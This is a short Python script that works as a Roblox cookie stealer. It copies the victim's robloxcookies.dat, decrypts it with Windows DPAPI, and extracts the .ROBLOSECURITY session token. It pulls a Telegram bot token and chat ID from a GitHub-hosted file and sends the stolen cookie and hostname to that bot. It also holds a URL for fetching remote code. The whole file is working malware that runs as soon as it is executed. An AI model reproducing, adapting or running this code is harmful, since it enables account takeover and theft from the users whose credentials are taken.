import os
import shutil
import base64
import win32crypt
import json
import re

import requests
import socket

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        return
    
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    with open(destination_path, 'r', encoding='utf-8') as file:
        try:
            file_content = json.load(file)
            
            encoded_cookies = file_content.get("CookiesData", "")
            
            if encoded_cookies:
                decoded_cookies = base64.b64decode(encoded_cookies)
                
                try:
                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]

                    pattern = r'\.ROBLOSECURITY\t([^;]+)'
                    match = re.search(pattern, decrypted_cookies.decode('utf-8', errors='ignore'))

                    if match:
                        robllosecurity_value = match.group(1)
                        return robllosecurity_value

                except Exception as e:
                    return
        
        except json.JSONDecodeError as e:
            return
        except Exception as e:
            return

url = "https://raw.githubusercontent.com/czawapro-dotcom/ahc1/refs/heads/main/Data"
urlEX = "https://raw.githubusercontent.com/czawapro-dotcom/ahc1/refs/heads/main/exec"

def retrieveData(args):
    if args == "exec":
        response = requests.get(urlEX)
        if response.status_code == 200:
            return response.text

    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        
        if args == "ChatID":
            return data["chat"]
        elif args == "Token":
            return data["token"]
        elif args == "retrieve":
            return data["retrieve"]
        elif args == "item":
            return data["item"]
        elif args == "topic":
            return data["topic"]

def send_webhook(cookie, args):
    chatID = retrieveData("ChatID")
    token = retrieveData("Token")

    if args == True:
        webhook = f"https://api.telegram.org/bot{token}/sendMessage"
        data={"chat_id": chatID,"text": f"\n\n{socket.gethostname()}:\n\n```{cookie}```\n\n\n开发者DC: @kemicn"}

        response = requests.post(webhook, json=data)
    else:
        print("Webhook is disabled.")


send_webhook(retrieve_roblox_cookies(), True)
